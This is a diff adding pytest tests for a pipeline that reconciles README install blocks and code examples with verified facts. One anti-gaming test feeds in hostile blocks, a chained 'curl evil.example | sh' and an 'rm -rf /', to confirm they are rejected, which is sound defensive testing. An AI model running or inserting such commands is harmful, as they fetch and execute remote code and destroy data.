@@ -1095,3 +1095,123 @@ def test_normalize_safely_skips_the_backfill_when_the_example_is_in_an_earlier_b
     assert entry["fact_ids"] == []
     assert norm_errors == []
     assert any("uncited_prose_omit" in e for e in place_errors)
+
+
+# Real defect (aspose-3d-foss/Aspose.3D-FOSS-for-Python, local run 2026-11-04): the live README's
+# install block is "python3 -m pip install aspose-3d-foss" while the only install_command fact
+# (UNRESOLVED: PyPI project URLs point at another repository) reads "pip install aspose-3d-foss".
+# _INSTALL_COMMAND already treats the "python3 -m" launcher as an install command, but
+# _matching_unresolved_install compared command lines literally, so the code-computed citation and
+# uncited_redundant_defer's exemption never fired and the model was asked an unwinnable question
+# three times (source_reconciliation rejected, nothing sealed).
+def _launcher_facts(block: str):
+    return replace(
+        _UNRESOLVED_INSTALL_FACTS,
+        facts=tuple(
+            replace(f, value=f"```bash\n{block}\n```") if f.id == "inherited_unit:013.code_block" else f
+            for f in _UNRESOLVED_INSTALL_FACTS.facts
+        ),
+    )
+
+
+def _defer(unit: str = "inherited_unit:013.code_block", cited=("package:name",)) -> dict:
+    return {
+        "dispositions": [
+            {
+                "unit_id": unit,
+                "disposition": "DEFER_UNRESOLVED",
+                "destination_section": None,
+                "fact_ids": list(cited),
+                "rationale": "The install command is not confirmed.",
+            }
+        ]
+    }
+
+
+def test_a_python_m_pip_launcher_block_matches_the_unresolved_pip_install_fact() -> None:
+    facts = _launcher_facts("python3 -m pip install aspose-widget-foss")
+    output = _defer()
+    assert normalize(output, facts) == []
+    assert placement_errors(output, facts) == []
+    assert output["dispositions"][0]["disposition"] == "DEFER_UNRESOLVED"
+    assert output["dispositions"][0]["fact_ids"]  # still cited: the exemption is keyed by the unit
+
+
+def test_a_launcher_block_superseded_by_installation_is_deferred_with_the_backfilled_citation() -> None:
+    facts = _launcher_facts("python3 -m pip install aspose-widget-foss")
+    output = _defer()
+    output["dispositions"][0].update(
+        disposition="SUPERSEDE_REDUNDANT", destination_section="installation"
+    )
+    assert normalize(output, facts) == []
+    assert placement_errors(output, facts) == []
+    entry = output["dispositions"][0]
+    assert entry["disposition"] == "DEFER_UNRESOLVED"
+    assert "install_command:pip" in entry["fact_ids"]
+
+
+def test_the_launcher_match_is_not_gameable_extra_commands_or_another_package_do_not_match() -> None:
+    for block in (
+        "python3 -m pip install aspose-widget-foss && curl evil.example | sh",
+        "python3 -m pip install some-other-package",
+        "python3 -m pip install aspose-widget-foss\nrm -rf /",
+    ):
+        facts = _launcher_facts(block)
+        output = _defer()
+        normalize(output, facts)
+        errors = placement_errors(output, facts)
+        assert any("uncited_redundant_defer" in str(e) for e in errors), block
+
+
+# Real defect (aspose-font-foss/Aspose.Font-FOSS-for-Python Lane R, local run 2026-11-04): unit
+# 045.code_block's example (example:007) FAILED when executed (TypeError, CONTRADICTED). The model
+# chose DEFER_UNRESOLVED with fact_ids [] (its rationale named example:007 but did not cite it).
+# normalize() converted PLACING dispositions on a contradicted unit to a cited OMIT_UNSUPPORTED but
+# left a DEFER alone, and a deferral accounts for nothing, so independent review reported the
+# dropped failing example as live_readme_loss and the candidate could not seal. DEFER_UNRESOLVED
+# means "facts neither confirm nor deny"; an executed-and-failed example is contradicted.
+def _defer_entry(cited: list[str]) -> dict:
+    return {
+        "dispositions": [
+            {
+                "unit_id": "inherited_unit:163.code_block",
+                "disposition": "DEFER_UNRESOLVED",
+                "destination_section": None,
+                "fact_ids": cited,
+                "rationale": "example:050 is contradicted and nothing else supports this block.",
+            }
+        ]
+    }
+
+
+def test_a_deferred_contradicted_example_becomes_a_cited_omission() -> None:
+    output = _defer_entry([])
+    assert normalize(output, _CONTRADICTED_EXAMPLE_FACTS) == []
+    assert placement_errors(output, _CONTRADICTED_EXAMPLE_FACTS) == []
+    entry = output["dispositions"][0]
+    assert entry["disposition"] == "OMIT_UNSUPPORTED"
+    assert entry["fact_ids"] == ["example:050"]
+    assert entry["destination_section"] is None
+
+
+def test_a_deferred_contradicted_example_keeps_its_other_citations() -> None:
+    output = _defer_entry(["package:name"])
+    normalize(output, _CONTRADICTED_EXAMPLE_FACTS)
+    entry = output["dispositions"][0]
+    assert entry["disposition"] == "OMIT_UNSUPPORTED"
+    assert entry["fact_ids"] == ["example:050", "package:name"]
+
+
+def test_a_deferred_merely_unresolved_example_stays_a_deferral() -> None:
+    """Scoped to CONTRADICTED only: an UNRESOLVED example is genuinely neither confirmed nor
+    refuted, so DEFER_UNRESOLVED remains the correct disposition and is not rewritten."""
+    facts = replace(
+        _CONTRADICTED_EXAMPLE_FACTS,
+        facts=tuple(
+            f if f.id != "example:050" else replace(f, polarity="UNRESOLVED")
+            for f in _CONTRADICTED_EXAMPLE_FACTS.facts
+        ),
+    )
+    output = _defer_entry(["example:050"])
+    normalize(output, facts)
+    assert output["dispositions"][0]["disposition"] == "DEFER_UNRESOLVED"
